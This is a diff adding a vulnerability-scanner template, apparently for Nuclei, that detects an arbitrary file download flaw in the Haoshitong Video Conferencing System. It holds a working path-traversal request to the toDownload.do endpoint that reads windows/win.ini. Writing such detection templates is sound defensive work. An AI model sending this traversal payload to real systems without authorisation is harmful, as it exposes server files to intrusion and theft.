@@ -1,0 +1,25 @@
+id: haoshitong-video-conferencing-arbitrary-download
+
+info:
+  name: Haoshitong Video Conferencing Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects an arbitrary file download vulnerability in Haoshitong Video Conferencing System.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
